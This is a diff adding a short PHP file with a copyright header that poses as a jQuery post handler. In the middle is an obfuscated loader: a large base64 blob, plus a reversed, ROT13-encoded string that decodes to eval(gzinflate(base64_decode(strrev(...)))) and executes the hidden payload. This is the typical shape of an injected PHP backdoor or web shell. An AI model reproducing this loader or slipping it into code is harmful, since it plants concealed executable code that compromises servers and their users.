@@ -1,0 +1,16 @@
+<?php
+
+/*
+ * Copyright 2010, Maintain Fit LLC, Daniel Watrous, All rights reserved
+ * By using this software you agree to be bound by the terms
+ * outlined in the License.txt file included with the software.
+ *
+ * If you still have questions please send them to helpdesk@danielwatrous.com
+ *
+ */
+
+ $mnCpYTYt_Mnp='C8PkcL2F1srfxKdVajamT6Sfv1GeiBOE/SfL1tjTe+jv3badwV9J6wwvckl53/zcvgnViK/stPXf/4XoM9igkM838daSkXq850wBs9JQnmt1kdxnrshndiiG/hx/x18+lvM1G1esc8iF0oJSfeNrux7pwasoFhELWpFaUe/DPaxNpfRYWuYV+aEOVvf78PmS5OFCfL8qJpGOrNs8rfWxh2kPf40guUSEENvZRwuV0hnMgZLla2C7bd3MGNIIMuRpCI1QvpsVubUFJ6yVlsTitn3MV8jBwZgrt2A2qy/2ut+MMcWwB2AJvHpeZLx2vHFpKumeNww0qZgHkj2MVsKA5CGIQCojm1cr/df37ud7mU7bfmBYbbfZXV3rUqZTbFZ1XxcqPfs/0yjgmHOAQ3x58d0L4iX1rK1+WTWLknxBMKdTgoOPWixq29aLo+bP/5gREIp4YZU/aKtFnoVaUGSpTuGQKrgZ1ZUUaj84BFI0H7FlV8EIMI6hRNMrDuq9lTuZm/uB4wzjv7JD/3hUcC6q+0oIkaWWcv6sE+HKsPtzxdAC4kDEqe98mty9hxya3n0e9O3BBd5pZ7G+/Iony9reKIPo1FyiK38wmJ4pTZEdrvBqm1ak8Tl0MP5bG0siX5X7QVOK/W2aVskDJOTmVfQK/7m1dypJv984a6XEd2hHddooJ6A3/T1zlkJvGKRST9aGFvLfXQhTl6BqME2p6PAycukZAo2QG+LAgL6hLlPCM6aQluDq34PvfFg8k+0s3aYcgUNy27p3gVLXnouJ5aTrb3xN/sGqXDhZm3NS1pgwdloZrdjCTiB0YJV7fCUUUyDnacimiMvDYsA2MCbFk5TrDKnMEHF45W2ecuUZ7KLc67V+k9H6tvdUqQ4wxGxPKP7ASiFLApFjPJbeoip+jqzPZj0s+2/eIM53dlzjlEVndQza00lt/ix7HJk+SbUN2L1D9bf0nBclxA4rjMNeu6UVU3tWEfrztQZywMszeE6CcqhpGLEtjokGtq9fA2He+gxlOgzpvUQP4MjjC/7XPM6+IPpLR/tshmFepu3vXVMtJnUPOI3kj0bPzBnb9Cw7myhyUw0YIHptspp7TjWnqFQSx8WSgpIhGcchm5CZMoucZq2Ey02OzwuOVZA/r7N91U1UhjlELNZosBOnNDnzDqPC4UdyLL4CUzP1RCJksqEjl1sgS9P3fpBP8VXB7p4YREPiiUNK6PGdebLLZpS/r9FCNrxUuD4F70GDPxeyIATmLmEAbegFCBCtLgAc2P/62IiZOJS6WB/GiLsRfG3e+NnGhciR4nz5Bv+YF5jAoFThMCi2V4CzJuw1QZGcNOMVVKqJoc9JokJWaFLpuUDDQvIOCnKMNp/DT5CkohInRl+T/ZOGw8WPISFSxkqM/astTOsOwOlhhGBRwGlkgI9n0tzrzwMz7zggRpEpxkI2Nwqz3z/qL58u7WLmbDg9tUWVKpKSR5S5hIFGVmERnj+FINToEL2vM4PEGJ+btdVt';$yixAgVIurjnzi=';))))caZ_gLGLcPaz$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$ePlNBMFZtpUH=strrev($yixAgVIurjnzi);$YiWlJdDwWIPwIBpEtPqL=str_rot13($ePlNBMFZtpUH);eval($YiWlJdDwWIPwIBpEtPqL);
+// Return message to jquery post call
+echo $message;
+
+?>
